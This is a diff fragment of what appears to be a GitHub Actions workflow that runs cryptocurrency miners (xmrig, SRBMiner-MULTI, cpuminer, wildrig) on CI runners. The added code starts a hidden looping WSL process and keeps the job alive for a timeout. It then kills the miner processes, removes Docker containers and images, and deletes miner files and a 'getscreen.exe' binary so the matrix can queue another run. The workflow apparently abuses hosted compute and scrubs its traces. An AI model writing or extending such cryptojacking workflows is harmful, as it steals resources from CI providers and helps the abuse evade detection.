+                Start-Process wsl -ArgumentList "-e bash -c `"while true; do $BashCmd; sleep 5; done`"" -WindowStyle Hidden
+                $Success = $true
+                Write-Host "✅ WSL successfully started!"
+                break
+
+              } catch {
+                Write-Host "❌ WSL encountered an exception: $($_.Exception.Message)"
+              }
+            }
+          } # end foreach
 
           if (-not $Success) {
-             Write-Host "`n🛑 FATAL: All execution methods failed. Terminating job."
-             exit 1
+            Write-Host "`n🛑 FATAL: All execution methods failed. Terminating job."
+            exit 1
           }
 
+      # ─────────────────────────────────────────────────────────────────────────
+      # RUNTIME TIMER & CLEANUP
+      # ─────────────────────────────────────────────────────────────────────────
       - name: Runtime Timer & Job Completion
         shell: powershell
         run: |
           $TimeoutMins = [int]"${{ inputs.timeout }}"
-          Write-Host "Mining active. Task is sleeping for $TimeoutMins minutes to keep job alive..."
+          Write-Host "Mining active. Sleeping $TimeoutMins minutes to keep job alive..."
           Start-Sleep -Seconds ($TimeoutMins * 60)
 
-          Write-Host "Timeout reached. Attempting universal cleanup..."
-          
-          Stop-Process -Name "cpuminer-sse2", "SRBMiner-MULTI", "xmrig", "wildrig-multi", "powershell" -Force -ErrorAction SilentlyContinue
-          
-          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
+          Write-Host "Timeout reached. Running universal cleanup..."
+
+          # Stop miner processes (all possible names across miners)
+          $MinerProcs = @("cpuminer", "cpuminer-sse2", "SRBMiner-MULTI", "xmrig", "wildrig-multi")
+          foreach ($p in $MinerProcs) {
+            Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
+          }
+
+          # Docker cleanup
+          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower() -replace '[^a-z0-9_-]', '-'
           docker stop $DockerName -t 0 2>$null
-          docker rm $DockerName 2>$null
-          
-          wsl bash -c "pkill -f miner" 2>$null
-          
-          # Clean Isolated Files
-          $WinDir = "windows_miner_$($env:DEVICE_NAME)"
-          $WinZip = "miner_$($env:DEVICE_NAME).zip"
-          $WinPs1 = "mine_$($env:DEVICE_NAME).ps1"
+          docker rm   $DockerName       2>$null
+          docker rmi  $DockerName -f    2>$null
+
+          # WSL cleanup
+          wsl bash -c "pkill -f '$($env:DEVICE_NAME)' 2>/dev/null; rm -rf /tmp/miner_$($env:DEVICE_NAME)" 2>$null
+
+          # Windows file cleanup
+          $WinDir    = "windows_miner_$($env:DEVICE_NAME)"
+          $WinZip    = "miner_$($env:DEVICE_NAME).zip"
+          $WinPs1    = "mine_$($env:DEVICE_NAME).ps1"
           $DockerFile = "Dockerfile_$($env:DEVICE_NAME)"
-          
-          if (Test-Path $WinDir) { Remove-Item -Path $WinDir -Recurse -Force -ErrorAction SilentlyContinue }
-          if (Test-Path $WinZip) { Remove-Item -Path $WinZip -Force -ErrorAction SilentlyContinue }
-          if (Test-Path $WinPs1) { Remove-Item -Path $WinPs1 -Force -ErrorAction SilentlyContinue }
-          if (Test-Path $DockerFile) { Remove-Item -Path $DockerFile -Force -ErrorAction SilentlyContinue }
-          
-          wsl bash -c "rm -rf /tmp/miner_$($env:DEVICE_NAME)" 2>$null
-          
-          Write-Host "Cleanup completed. Closing runner task so matrix can queue the next iteration..."
+
+          foreach ($item in @($WinDir, $WinZip, $WinPs1, $DockerFile, "getscreen.exe")) {
+            if (Test-Path $item) {
+              Remove-Item -Path $item -Recurse -Force -ErrorAction SilentlyContinue
+            }
+          }
+
+          Write-Host "Cleanup done. Closing runner task so matrix can queue next iteration..."
